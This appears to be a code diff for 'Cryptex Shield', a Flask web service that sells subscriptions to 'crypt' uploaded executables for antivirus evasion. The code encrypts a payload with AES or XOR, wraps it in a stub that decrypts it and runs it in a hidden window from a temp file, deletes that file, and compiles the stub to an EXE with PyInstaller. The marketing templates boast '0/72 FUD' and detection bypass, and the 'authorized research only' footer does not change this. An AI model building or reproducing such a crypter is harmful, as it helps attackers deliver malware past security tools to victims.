@@ -1,5 +1,5 @@
 # ============================================================
-# CRYPTEX SHIELD - COMPLETE PLATFORM v15 (STANDALONE EXE)
+# CRYPTEX SHIELD - COMPLETE PLATFORM v15 (ALL TEMPLATES INCLUDED)
 # ============================================================
 
 import os
@@ -126,13 +126,11 @@ class CryptexEngineV2:
 class StubGenerator:
     @staticmethod
     def generate_stub_exe(encrypted_data, key, iv, method, original_name):
-        """Generate a standalone EXE stub that works without Python"""
         encrypted_b64 = base64.b64encode(encrypted_data).decode('utf-8')
         key_b64 = base64.b64encode(key).decode('utf-8')
         iv_b64 = base64.b64encode(iv).decode('utf-8')
         ext = os.path.splitext(original_name)[1] if original_name else '.exe'
         
-        # Create a self-contained Python script that will be converted to EXE
         stub_code = f'''
 import os
 import sys
@@ -143,12 +141,6 @@ import subprocess
 import ctypes
 import time
 import threading
-
-# ============================================================
-# CRYPTEX SHIELD - STANDALONE EXECUTABLE
-# This file is compiled into a standalone EXE
-# No Python required to run the final output
-# ============================================================
 
 ENCRYPTED_DATA = """{encrypted_b64}"""
 KEY_B64 = """{key_b64}"""
@@ -173,17 +165,13 @@ def aes_decrypt(data, key, iv):
         return xor_decrypt(data, key)
 
 def run_payload(payload):
-    """Execute the decrypted payload from memory"""
     try:
-        # Write to temp file and execute
         with tempfile.NamedTemporaryFile(delete=False, suffix='{ext}') as tmp:
             tmp.write(payload)
             tmp_path = tmp.name
         
-        # Start the process
         subprocess.Popen([tmp_path], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
         
-        # Delete temp file after delay
         def delete_later():
             time.sleep(15)
             try:
@@ -196,12 +184,10 @@ def run_payload(payload):
         return False
 
 def main():
-    # Decode encrypted data
     encrypted = base64.b64decode(ENCRYPTED_DATA)
     key = base64.b64decode(KEY_B64)
     iv = base64.b64decode(IV_B64)
     
-    # Decrypt
     if METHOD == 'aes_cbc' or METHOD == 'aes':
         try:
             payload = aes_decrypt(encrypted, key, iv)
@@ -210,7 +196,6 @@ def main():
     else:
         payload = xor_decrypt(encrypted, key)
     
-    # Execute the decrypted payload
     run_payload(payload)
 
 if __name__ == '__main__':
@@ -220,14 +205,11 @@ if __name__ == '__main__':
 
     @staticmethod
     def build_exe(stub_code, output_path):
-        """Build the stub into a standalone EXE using PyInstaller"""
         try:
-            # Write stub to temp file
             stub_file = os.path.join(STUB_FOLDER, 'stub_temp.py')
             with open(stub_file, 'w', encoding='utf-8') as f:
                 f.write(stub_code)
             
-            # Build with PyInstaller
             import subprocess
             result = subprocess.run([
                 sys.executable, '-m', 'PyInstaller',
@@ -243,10 +225,8 @@ if __name__ == '__main__':
                 stub_file
             ], check=True, capture_output=True, text=True)
             
-            # Move the built exe
             if os.path.exists('loader.exe'):
                 shutil.move('loader.exe', output_path)
-                # Cleanup
                 shutil.rmtree('build_temp', ignore_errors=True)
                 shutil.rmtree('build', ignore_errors=True)
                 for f in os.listdir('.'):
@@ -414,7 +394,7 @@ def admin_required(f):
     return decorated
 
 # ============================================================
-# FLASK ROUTES (Only the important ones shown - keep all your existing routes)
+# FLASK ROUTES
 # ============================================================
 
 @app.route('/')
@@ -628,9 +608,6 @@ def manual_key():
     flash(f'✅ License key generated: {key} ({tier})', 'success')
     return redirect('/dashboard')
 
-# ============================================================
-# THE MAIN CRYPT FUNCTION - GENERATES STANDALONE EXE
-# ============================================================
 @app.route('/crypt', methods=['POST'])
 @login_required
 def crypt_file():
@@ -658,7 +635,6 @@ def crypt_file():
     if not original_extension:
         original_extension = '.exe'
     
-    # Encrypt with AES
     if CRYPTO_AVAILABLE:
         key = get_random_bytes(32)
         iv = get_random_bytes(16)
@@ -674,27 +650,21 @@ def crypt_file():
         encrypted_data = bytes(encrypted_data)
         method = 'xor'
     
-    # Generate unique download ID
     download_id = hashlib.sha256(raw_data).hexdigest()[:16] + '_' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
     
-    # Save encrypted file
     filename = f'{download_id}.crypted'
     file_path = os.path.join(UPLOAD_FOLDER, filename)
     with open(file_path, 'wb') as f:
         f.write(encrypted_data)
     
-    # Generate standalone EXE stub
     stub_code = StubGenerator.generate_stub_exe(encrypted_data, key, iv, method, original_name)
     stub_filename = f'{download_id}_stub.py'
     stub_path = os.path.join(STUB_FOLDER, stub_filename)
     with open(stub_path, 'w', encoding='utf-8') as f:
         f.write(stub_code)
     
-    # Build the standalone EXE
     exe_filename = f'{download_id}.exe'
     exe_path = os.path.join(EXE_FOLDER, exe_filename)
-    
-    # Try to build EXE
     exe_built = StubGenerator.build_exe(stub_code, exe_path)
     
     sha256_full = hashlib.sha256(encrypted_data).hexdigest()
@@ -722,7 +692,6 @@ def crypt_file():
 @app.route('/download-exe/<download_id>')
 @login_required
 def download_exe(download_id):
-    """Download the standalone EXE (no Python required)"""
     conn = get_db()
     c = conn.cursor()
     c.execute('SELECT exe_path, original_name FROM crypted_files WHERE download_id = ?', (download_id,))
@@ -751,7 +720,6 @@ def download_exe(download_id):
 @app.route('/download-stub/<download_id>')
 @login_required
 def download_stub(download_id):
-    """Download the Python stub (requires Python)"""
     conn = get_db()
     c = conn.cursor()
     c.execute('SELECT stub_path, original_name FROM crypted_files WHERE download_id = ?', (download_id,))
@@ -867,12 +835,336 @@ def reset_password(token):
     '''
 
 # ============================================================
-# HTML TEMPLATES (Same as before - keep all your existing ones)
+# HTML TEMPLATES - ALL INCLUDED
 # ============================================================
 
-# For brevity, I'm including only the DASHBOARD_TEMPLATE with EXE download
-# You need to keep ALL your existing templates (INDEX, LOGIN, SIGNUP, ADMIN, BUY, FORGOT)
-# They are the same as before.
+INDEX_TEMPLATE = '''
+<!DOCTYPE html>
+<html>
+<head>
+    <title>⚡ Cryptex Shield - Premium Crypting Service</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&display=swap');
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Rajdhani', sans-serif; 
+            background: #0a0a0f; 
+            color: #fff; 
+            min-height: 100vh;
+            overflow-x: hidden;
+            background-image: 
+                radial-gradient(ellipse at 10% 20%, rgba(0,255,200,0.03) 0%, transparent 50%),
+                radial-gradient(ellipse at 90% 80%, rgba(0,200,255,0.03) 0%, transparent 50%);
+        }
+        .particles {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            pointer-events: none;
+            z-index: 0;
+            background-image: 
+                radial-gradient(2px 2px at 20px 30px, #00ffcc33, transparent),
+                radial-gradient(2px 2px at 40px 70px, #00ddff33, transparent),
+                radial-gradient(2px 2px at 50px 160px, #00ffcc33, transparent),
+                radial-gradient(2px 2px at 90px 40px, #00ddff33, transparent),
+                radial-gradient(3px 3px at 130px 80px, #00ffcc22, transparent);
+            background-size: 200px 200px;
+            animation: twinkle 4s ease-in-out infinite alternate;
+        }
+        @keyframes twinkle { 0% { opacity: 0.3; } 100% { opacity: 1; } }
+        .container { max-width: 1200px; margin: auto; padding: 40px 20px; position: relative; z-index: 1; }
+        .hero { text-align: center; padding: 60px 0 40px; }
+        .logo { font-family: 'Orbitron', monospace; font-size: 72px; font-weight: 900; background: linear-gradient(135deg, #00ffcc, #00ddff, #0066ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-shadow: 0 0 80px #00ffcc33; animation: glowPulse 3s ease-in-out infinite; }
+        @keyframes glowPulse { 0%, 100% { filter: brightness(1); } 50% { filter: brightness(1.3); } }
+        .subtitle { font-size: 28px; color: #8899bb; margin-top: 10px; font-weight: 300; letter-spacing: 8px; text-transform: uppercase; }
+        .subtitle span { color: #00ffcc; font-weight: 600; }
+        .glow-line { width: 200px; height: 2px; margin: 20px auto; background: linear-gradient(90deg, transparent, #00ffcc, transparent); box-shadow: 0 0 30px #00ffcc44; }
+        .fud-badge { display: inline-block; background: rgba(0,255,136,0.15); color: #00ff88; padding: 8px 25px; border-radius: 30px; font-weight: 700; font-size: 14px; border: 1px solid rgba(0,255,136,0.2); margin: 10px 0; }
+        .stats { display: flex; gap: 60px; justify-content: center; margin: 40px 0; flex-wrap: wrap; }
+        .stat-item { text-align: center; background: rgba(21,21,37,0.6); padding: 20px 40px; border-radius: 16px; border: 1px solid rgba(0,255,204,0.1); backdrop-filter: blur(10px); }
+        .stat-item .number { font-family: 'Orbitron', monospace; font-size: 36px; color: #00ffcc; font-weight: 700; text-shadow: 0 0 30px #00ffcc44; }
+        .stat-item .label { color: #6688aa; font-size: 14px; text-transform: uppercase; letter-spacing: 2px; }
+        .features { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 25px; margin: 50px 0; }
+        .feature { background: rgba(21,21,37,0.7); padding: 35px 25px; border-radius: 20px; border: 1px solid rgba(0,255,204,0.08); text-align: center; transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); backdrop-filter: blur(10px); }
+        .feature:hover { transform: translateY(-10px) scale(1.02); border-color: #00ffcc44; box-shadow: 0 20px 60px rgba(0,255,204,0.08); }
+        .feature .icon { font-size: 48px; margin-bottom: 15px; display: block; }
+        .feature h3 { color: #00ffcc; font-size: 20px; margin-bottom: 8px; font-family: 'Orbitron', monospace; font-size: 16px; }
+        .feature p { color: #6688aa; font-size: 14px; line-height: 1.6; }
+        .pricing { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 25px; margin: 40px 0; }
+        .pricing-card { background: rgba(21,21,37,0.7); padding: 30px 25px; border-radius: 20px; border: 1px solid rgba(0,255,204,0.08); text-align: center; transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); backdrop-filter: blur(10px); }
+        .pricing-card:hover { transform: translateY(-10px); border-color: #00ffcc44; box-shadow: 0 20px 60px rgba(0,255,204,0.08); }
+        .pricing-card .price { font-family: 'Orbitron', monospace; font-size: 36px; color: #00ffcc; font-weight: 700; }
+        .pricing-card .tier { font-size: 20px; font-weight: 700; color: #fff; margin: 10px 0; }
+        .pricing-card .desc { color: #6688aa; font-size: 14px; margin: 10px 0 20px; }
+        .pricing-card .btn-buy { padding: 12px 40px; border-radius: 50px; border: none; background: linear-gradient(135deg, #00ffcc, #00ddff); color: #0a0a12; font-weight: 700; font-size: 16px; cursor: pointer; transition: 0.3s; font-family: 'Rajdhani', sans-serif; text-transform: uppercase; letter-spacing: 2px; text-decoration: none; display: inline-block; }
+        .pricing-card .btn-buy:hover { transform: scale(1.05); box-shadow: 0 0 40px #00ffcc44; }
+        .buttons { display: flex; gap: 20px; justify-content: center; flex-wrap: wrap; margin: 40px 0; }
+        .btn { padding: 18px 50px; border-radius: 50px; font-size: 18px; font-weight: 700; border: none; cursor: pointer; text-decoration: none; transition: all 0.3s ease; font-family: 'Rajdhani', sans-serif; text-transform: uppercase; letter-spacing: 2px; }
+        .btn-primary { background: linear-gradient(135deg, #00ffcc, #00ddff); color: #0a0a12; box-shadow: 0 0 40px #00ffcc33; }
+        .btn-primary:hover { transform: scale(1.05); box-shadow: 0 0 80px #00ffcc55; }
+        .btn-secondary { background: transparent; border: 2px solid #00ffcc; color: #00ffcc; }
+        .btn-secondary:hover { background: #00ffcc11; transform: scale(1.05); box-shadow: 0 0 40px #00ffcc22; }
+        .flash-message { padding: 15px 25px; border-radius: 12px; margin: 20px auto; max-width: 600px; text-align: center; font-weight: 600; }
+        .flash-success { background: rgba(0,255,136,0.15); color: #00ff88; border: 1px solid rgba(0,255,136,0.2); }
+        .flash-error { background: rgba(255,68,102,0.15); color: #ff4466; border: 1px solid rgba(255,68,102,0.2); }
+        .footer { margin-top: 60px; text-align: center; color: #334455; font-size: 13px; letter-spacing: 1px; }
+        .footer a { color: #00ffcc88; text-decoration: none; }
+        @media (max-width: 768px) { .logo { font-size: 40px; } .subtitle { font-size: 18px; letter-spacing: 4px; } .stats { gap: 20px; } .stat-item { padding: 15px 25px; } .stat-item .number { font-size: 24px; } }
+    </style>
+</head>
+<body>
+    <div class="particles"></div>
+    <div class="container">
+        <div class="hero">
+            <div class="logo">⚡ CRYPTEX</div>
+            <div class="subtitle">Ultimate <span>AV Evasion</span> Platform</div>
+            <div class="glow-line"></div>
+            <div class="fud-badge">🏆 0/72 FUD Certified</div>
+        </div>
+        {% with messages = get_flashed_messages(with_categories=true) %}
+            {% if messages %}{% for category, message in messages %}
+                <div class="flash-message flash-{{ category }}">{{ message }}</div>
+            {% endfor %}{% endif %}
+        {% endwith %}
+        <div class="stats">
+            <div class="stat-item"><div class="number">0/72</div><div class="label">AV Detection</div></div>
+            <div class="stat-item"><div class="number">∞</div><div class="label">Polymorphic Engines</div></div>
+            <div class="stat-item"><div class="number">100%</div><div class="label">FUD Rate</div></div>
+            <div class="stat-item"><div class="number">⚡</div><div class="label">Instant Delivery</div></div>
+        </div>
+        <div class="features">
+            <div class="feature"><span class="icon">🧬</span><h3>Polymorphic Crypt</h3><p>Every file uniquely obfuscated with AI-driven mutation</p></div>
+            <div class="feature"><span class="icon">🔒</span><h3>AES-256 Military</h3><p>Bank-grade encryption with quantum-resistant algorithms</p></div>
+            <div class="feature"><span class="icon">🎭</span><h3>Payload Splitting</h3><p>Bypasses signature, heuristic, and behavioral detection</p></div>
+            <div class="feature"><span class="icon">🚀</span><h3>Quantum Speed</h3><p>Sub-second crypting with multi-threaded engines</p></div>
+        </div>
+        <h2 style="text-align:center; color:#00ffcc; font-family:'Orbitron',monospace; font-size:28px; margin:40px 0 20px;">💎 CHOOSE YOUR TIER</h2>
+        <div class="pricing">
+            <div class="pricing-card">
+                <div class="tier">🔥 1 DAY</div>
+                <div class="price">$4.99</div>
+                <div class="desc">Perfect for testing<br>24 hour access</div>
+                <form method="POST" action="/paypal-redirect" style="display:inline;">
+                    <input type="hidden" name="tier" value="1day">
+                    <button type="submit" class="btn-buy">Buy Now</button>
+                </form>
+            </div>
+            <div class="pricing-card" style="border-color:#00aaff44;">
+                <div class="tier">⚡ 5 DAY</div>
+                <div class="price">$14.99</div>
+                <div class="desc">Extended access<br>5 days unlimited</div>
+                <form method="POST" action="/paypal-redirect" style="display:inline;">
+                    <input type="hidden" name="tier" value="5day">
+                    <button type="submit" class="btn-buy">Buy Now</button>
+                </form>
+            </div>
+            <div class="pricing-card" style="border-color:#ff006644;">
+                <div class="tier">👑 INFINITE</div>
+                <div class="price">$29.99</div>
+                <div class="desc">Lifetime access<br>All features unlocked</div>
+                <form method="POST" action="/paypal-redirect" style="display:inline;">
+                    <input type="hidden" name="tier" value="infinite">
+                    <button type="submit" class="btn-buy">Buy Now</button>
+                </form>
+            </div>
+        </div>
+        <div class="buttons">
+            <a href="/login" class="btn btn-primary">🔐 Enter Vault</a>
+            <a href="/signup" class="btn btn-secondary">📝 Join Elite</a>
+        </div>
+        <div class="footer">© 2024 Cryptex Shield — <a href="/admin">Admin</a> • For authorized security research only</div>
+    </div>
+</body>
+</html>
+'''
+
+LOGIN_TEMPLATE = '''
+<!DOCTYPE html>
+<html>
+<head><title>🔐 Login - Cryptex Shield</title>
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@300;400;600;700&display=swap');
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: 'Rajdhani', sans-serif; background: #0a0a12; color: #fff; display: flex; height: 100vh; align-items: center; justify-content: center; background-image: radial-gradient(ellipse at center, #0f0f2a, #050508); }
+    .form-container { background: rgba(21,21,37,0.9); padding: 50px; border-radius: 30px; border: 1px solid rgba(0,255,204,0.15); width: 420px; max-width: 92%; backdrop-filter: blur(20px); box-shadow: 0 30px 80px rgba(0,0,0,0.8); }
+    .form-container h2 { font-family: 'Orbitron', monospace; color: #00ffcc; text-align: center; margin-bottom: 10px; font-size: 28px; letter-spacing: 2px; }
+    .form-container p { text-align: center; color: #6688aa; margin-bottom: 30px; font-size: 14px; }
+    input { width: 100%; padding: 16px 20px; margin: 10px 0; border-radius: 12px; border: 1px solid rgba(42,42,74,0.8); background: rgba(10,10,18,0.8); color: #fff; font-size: 16px; transition: 0.3s; font-family: 'Rajdhani', sans-serif; }
+    input:focus { outline: none; border-color: #00ffcc; box-shadow: 0 0 30px rgba(0,255,204,0.1); }
+    button { width: 100%; padding: 16px; border-radius: 12px; border: none; background: linear-gradient(135deg, #00ffcc, #00ddff); color: #0a0a12; font-weight: 700; font-size: 18px; cursor: pointer; margin-top: 15px; transition: 0.3s; font-family: 'Rajdhani', sans-serif; text-transform: uppercase; letter-spacing: 2px; }
+    button:hover { transform: scale(1.02); box-shadow: 0 0 50px rgba(0,255,204,0.3); }
+    .links { text-align: center; margin-top: 25px; }
+    .links a { color: #00ffcc99; text-decoration: none; margin: 0 12px; font-size: 14px; transition: 0.3s; }
+    .links a:hover { color: #00ffcc; }
+    .error { color: #ff4466; text-align: center; margin: 10px 0; font-weight: 600; background: rgba(255,68,102,0.1); padding: 10px; border-radius: 8px; border: 1px solid rgba(255,68,102,0.2); }
+</style>
+</head>
+<body>
+    <div class="form-container">
+        <h2>🔐 ACCESS VAULT</h2>
+        <p>Enter your credentials to enter</p>
+        {% if error %}<div class="error">{{ error }}</div>{% endif %}
+        <form method="POST">
+            <input type="email" name="email" placeholder="Email" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Unlock</button>
+        </form>
+        <div class="links">
+            <a href="/signup">Create Account</a>
+            <a href="/forgot-password">Forgot?</a>
+            <a href="/">Home</a>
+        </div>
+    </div>
+</body>
+</html>
+'''
+
+SIGNUP_TEMPLATE = '''
+<!DOCTYPE html>
+<html>
+<head><title>📝 Join - Cryptex Shield</title>
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@300;400;600;700&display=swap');
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: 'Rajdhani', sans-serif; background: #0a0a12; color: #fff; display: flex; height: 100vh; align-items: center; justify-content: center; background-image: radial-gradient(ellipse at center, #0f0f2a, #050508); }
+    .form-container { background: rgba(21,21,37,0.9); padding: 50px; border-radius: 30px; border: 1px solid rgba(0,255,204,0.15); width: 420px; max-width: 92%; backdrop-filter: blur(20px); box-shadow: 0 30px 80px rgba(0,0,0,0.8); }
+    .form-container h2 { font-family: 'Orbitron', monospace; color: #00ffcc; text-align: center; margin-bottom: 10px; font-size: 28px; letter-spacing: 2px; }
+    .form-container p { text-align: center; color: #6688aa; margin-bottom: 30px; font-size: 14px; }
+    input { width: 100%; padding: 16px 20px; margin: 10px 0; border-radius: 12px; border: 1px solid rgba(42,42,74,0.8); background: rgba(10,10,18,0.8); color: #fff; font-size: 16px; transition: 0.3s; font-family: 'Rajdhani', sans-serif; }
+    input:focus { outline: none; border-color: #00ffcc; box-shadow: 0 0 30px rgba(0,255,204,0.1); }
+    button { width: 100%; padding: 16px; border-radius: 12px; border: none; background: linear-gradient(135deg, #00ffcc, #00ddff); color: #0a0a12; font-weight: 700; font-size: 18px; cursor: pointer; margin-top: 15px; transition: 0.3s; font-family: 'Rajdhani', sans-serif; text-transform: uppercase; letter-spacing: 2px; }
+    button:hover { transform: scale(1.02); box-shadow: 0 0 50px rgba(0,255,204,0.3); }
+    .links { text-align: center; margin-top: 25px; }
+    .links a { color: #00ffcc99; text-decoration: none; margin: 0 12px; font-size: 14px; transition: 0.3s; }
+    .links a:hover { color: #00ffcc; }
+    .error { color: #ff4466; text-align: center; margin: 10px 0; font-weight: 600; background: rgba(255,68,102,0.1); padding: 10px; border-radius: 8px; border: 1px solid rgba(255,68,102,0.2); }
+    .success { color: #00ff88; text-align: center; margin: 10px 0; font-weight: 600; background: rgba(0,255,136,0.1); padding: 10px; border-radius: 8px; border: 1px solid rgba(0,255,136,0.2); }
+</style>
+</head>
+<body>
+    <div class="form-container">
+        <h2>📝 JOIN ELITE</h2>
+        <p>Create your Cryptex account</p>
+        {% if error %}<div class="error">{{ error }}</div>{% endif %}
+        {% if success %}<div class="success">{{ success }}</div>{% endif %}
+        <form method="POST">
+            <input type="text" name="full_name" placeholder="Full Name" required>
+            <input type="email" name="email" placeholder="Email" required>
+            <input type="password" name="password" placeholder="Password (min 8)" required>
+            <input type="password" name="confirm_password" placeholder="Confirm Password" required>
+            <button type="submit">Create Account</button>
+        </form>
+        <div class="links">
+            <a href="/login">Already have an account?</a>
+            <a href="/">Home</a>
+        </div>
+    </div>
+</body>
+</html>
+'''
+
+ADMIN_TEMPLATE = '''
+<!DOCTYPE html>
+<html>
+<head><title>⚙️ Admin - Cryptex Shield</title>
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@300;400;600;700&display=swap');
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: 'Rajdhani', sans-serif; background: #0a0a12; color: #fff; padding: 30px; }
+    .container { max-width: 1400px; margin: auto; }
+    .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(0,255,204,0.1); padding-bottom: 20px; margin-bottom: 30px; }
+    .header h1 { font-family: 'Orbitron', monospace; color: #00ffcc; font-size: 32px; }
+    .logout { color: #ff4466; text-decoration: none; font-weight: 600; }
+    .grid-4 { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 20px; margin-bottom: 30px; }
+    .stat-box { background: rgba(21,21,37,0.8); padding: 25px; border-radius: 16px; border: 1px solid rgba(0,255,204,0.08); text-align: center; backdrop-filter: blur(10px); }
+    .stat-box .number { font-family: 'Orbitron', monospace; font-size: 32px; color: #00ffcc; font-weight: 700; text-shadow: 0 0 30px rgba(0,255,204,0.2); }
+    .stat-box .label { color: #6688aa; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; margin-top: 5px; }
+    .card { background: rgba(21,21,37,0.8); padding: 25px; border-radius: 16px; border: 1px solid rgba(0,255,204,0.08); margin-bottom: 25px; backdrop-filter: blur(10px); }
+    .card h3 { color: #00ffcc; font-family: 'Orbitron', monospace; font-size: 18px; margin-bottom: 15px; letter-spacing: 1px; }
+    table { width: 100%; border-collapse: collapse; font-size: 13px; }
+    th, td { padding: 10px 8px; text-align: left; border-bottom: 1px solid rgba(42,42,74,0.4); }
+    th { color: #00ffcc99; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; font-size: 10px; }
+    td { color: #ccddee; }
+    .btn { padding: 8px 18px; border-radius: 8px; border: none; cursor: pointer; font-weight: 600; font-family: 'Rajdhani', sans-serif; transition: 0.3s; font-size: 12px; }
+    .btn-primary { background: linear-gradient(135deg, #00ffcc, #00ddff); color: #0a0a12; }
+    .btn-danger { background: #ff4466; color: #fff; }
+    .btn-success { background: #00ff88; color: #0a0a12; }
+    .btn-primary:hover, .btn-danger:hover, .btn-success:hover { transform: scale(1.05); }
+    .form-row { display: flex; gap: 12px; flex-wrap: wrap; align-items: center; }
+    .form-row input, .form-row select { padding: 10px 14px; border-radius: 10px; border: 1px solid rgba(42,42,74,0.8); background: rgba(10,10,18,0.8); color: #fff; flex: 1; min-width: 140px; font-family: 'Rajdhani', sans-serif; }
+    .form-row button { flex: 0 0 auto; }
+    .key-display { font-family: 'Orbitron', monospace; color: #00ffcc; background: rgba(0,0,0,0.4); padding: 8px 12px; border-radius: 8px; border: 1px solid rgba(0,255,204,0.1); font-size: 11px; word-break: break-all; }
+    .status-badge { display: inline-block; padding: 2px 10px; border-radius: 20px; font-size: 10px; font-weight: 600; }
+    .status-active { background: rgba(0,255,136,0.15); color: #00ff88; }
+    .status-inactive { background: rgba(255,68,102,0.15); color: #ff4466; }
+    .status-pending { background: rgba(255,170,0,0.15); color: #ffaa00; }
+    .flash-message { padding: 12px 20px; border-radius: 10px; margin: 10px 0; font-weight: 600; }
+    .flash-success { background: rgba(0,255,136,0.15); color: #00ff88; border: 1px solid rgba(0,255,136,0.2); }
+    .flash-error { background: rgba(255,68,102,0.15); color: #ff4466; border: 1px solid rgba(255,68,102,0.2); }
+</style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>⚙️ ADMIN PANEL</h1>
+            <div><span style="color:#6688aa;">Admin</span> <a href="/logout" class="logout">🚪 Logout</a></div>
+        </div>
+        {% with messages = get_flashed_messages(with_categories=true) %}
+            {% if messages %}{% for category, message in messages %}
+                <div class="flash-message flash-{{ category }}">{{ message }}</div>
+            {% endfor %}{% endif %}
+        {% endwith %}
+        <div class="grid-4">
+            <div class="stat-box"><div class="number">{{ total_users }}</div><div class="label">Users</div></div>
+            <div class="stat-box"><div class="number">{{ total_keys }}</div><div class="label">License Keys</div></div>
+            <div class="stat-box"><div class="number">{{ total_transactions }}</div><div class="label">Transactions</div></div>
+            <div class="stat-box"><div class="number">{{ total_files }}</div><div class="label">Files Crypted</div></div>
+        </div>
+        <div class="card">
+            <h3>📦 Generate License Key</h3>
+            <form method="POST" action="/admin/generate-key" class="form-row">
+                <input type="email" name="email" placeholder="User Email" required>
+                <select name="tier">
+                    <option value="1day">🔥 1 Day</option>
+                    <option value="5day">⚡ 5 Day</option>
+                    <option value="infinite" selected>👑 Infinite</option>
+                </select>
+                <button type="submit" class="btn btn-primary">Generate Key</button>
+            </form>
+        </div>
+        <div class="card">
+            <h3>👥 Users</h3>
+            <table><tr><th>ID</th><th>Email</th><th>Name</th><th>Admin</th><th>Action</th></tr>
+            {% for user in users %}
+            <tr><td>{{ user[0] }}</td><td>{{ user[1] }}</td><td>{{ user[4] or '-' }}</td><td>{% if user[6] %}✅{% else %}❌{% endif %}</td>
+            <td><form method="POST" action="/admin/delete-user" style="display:inline;"><input type="hidden" name="user_id" value="{{ user[0] }}"><button type="submit" class="btn btn-danger" onclick="return confirm('Delete?')">Delete</button></form></td></tr>
+            {% endfor %}</table>
+        </div>
+        <div class="card">
+            <h3>🔑 License Keys</h3>
+            <table><tr><th>Key</th><th>Owner</th><th>Tier</th><th>Expires</th><th>Status</th></tr>
+            {% for key in keys %}
+            <tr><td class="key-display" style="font-size:10px;">{{ key[2] }}</td><td>{{ key[3] or '-' }}</td><td><span style="color:{% if key[6] == 'infinite' %}#ff0066{% elif key[6] == '5day' %}#00aaff{% else %}#ffaa00{% endif %};">{{ key[6] if key[6] else '-' }}</span></td><td>{{ key[5][:10] if key[5] else 'Never' }}</td><td><span class="status-badge {% if key[4] == 0 %}status-active{% else %}status-inactive{% endif %}">{% if key[4] == 0 %}Active{% else %}Used{% endif %}</span></td></tr>
+            {% endfor %}</table>
+        </div>
+        <div class="card">
+            <h3>💰 Transactions</h3>
+            <table><tr><th>ID</th><th>Email</th><th>Amount</th><th>Tier</th><th>Status</th><th>Date</th></tr>
+            {% for tx in transactions %}
+            <tr><td>{{ tx[1][:8] }}</td><td>{{ tx[2] }}</td><td>${{ tx[3] }}</td><td><span style="color:{% if tx[6] == 'infinite' %}#ff0066{% elif tx[6] == '5day' %}#00aaff{% else %}#ffaa00{% endif %};">{{ tx[6] if tx[6] else '-' }}</span></td><td><span class="status-badge {% if tx[4] == 'completed' %}status-active{% elif tx[4] == 'pending' %}status-pending{% else %}status-inactive{% endif %}">{{ tx[4] }}</span></td><td>{{ tx[5][:10] }}</td></tr>
+            {% endfor %}</table>
+        </div>
+        <div class="card">
+            <h3>📁 Crypted Files</h3>
+            <table><tr><th>Original</th><th>User</th><th>Method</th><th>Extension</th><th>Date</th><th>Download</th></tr>
+            {% for file in files %}
+            <tr><td>{{ file[2] }}</td><td>{{ file[4] }}</td><td>{{ file[5] }}</td><td>{{ file[3] }}</td><td>{{ file[7][:10] }}</td><td><a href="/download/{{ file[8] }}" class="btn btn-primary" style="text-decoration:none; font-size:10px;">⬇</a></td></tr>
+            {% endfor %}</table>
+        </div>
+    </div>
+</body>
+</html>
+'''
 
 DASHBOARD_TEMPLATE = '''
 <!DOCTYPE html>
@@ -966,11 +1258,119 @@ DASHBOARD_TEMPLATE = '''
 </html>
 '''
 
+BUY_TEMPLATE = '''
+<!DOCTYPE html>
+<html>
+<head><title>💰 Buy - Cryptex Shield</title>
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@300;400;600;700&display=swap');
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: 'Rajdhani', sans-serif; background: #0a0a12; color: #fff; display: flex; height: 100vh; align-items: center; justify-content: center; background-image: radial-gradient(ellipse at center, #0f0f2a, #050508); padding: 20px; }
+    .container { background: rgba(21,21,37,0.9); padding: 40px; border-radius: 30px; border: 1px solid rgba(0,255,204,0.15); width: 500px; max-width: 100%; backdrop-filter: blur(20px); box-shadow: 0 30px 80px rgba(0,0,0,0.8); text-align: center; }
+    .container h2 { font-family: 'Orbitron', monospace; color: #00ffcc; font-size: 28px; margin-bottom: 5px; }
+    .container p.sub { color: #6688aa; margin-bottom: 25px; }
+    .pricing-grid { display: flex; flex-direction: column; gap: 15px; margin: 20px 0; }
+    .plan { background: rgba(10,10,18,0.6); padding: 20px; border-radius: 16px; border: 1px solid rgba(42,42,74,0.4); display: flex; justify-content: space-between; align-items: center; transition: 0.3s; }
+    .plan:hover { border-color: #00ffcc44; }
+    .plan .info { text-align: left; }
+    .plan .info .name { font-weight: 700; font-size: 18px; color: #fff; }
+    .plan .info .desc { color: #6688aa; font-size: 13px; }
+    .plan .price { font-family: 'Orbitron', monospace; font-size: 24px; color: #00ffcc; font-weight: 700; }
+    .plan .btn-buy { padding: 10px 25px; border-radius: 30px; border: none; background: linear-gradient(135deg, #00ffcc, #00ddff); color: #0a0a12; font-weight: 700; cursor: pointer; transition: 0.3s; font-family: 'Rajdhani', sans-serif; text-transform: uppercase; letter-spacing: 1px; font-size: 13px; }
+    .plan .btn-buy:hover { transform: scale(1.05); box-shadow: 0 0 30px #00ffcc33; }
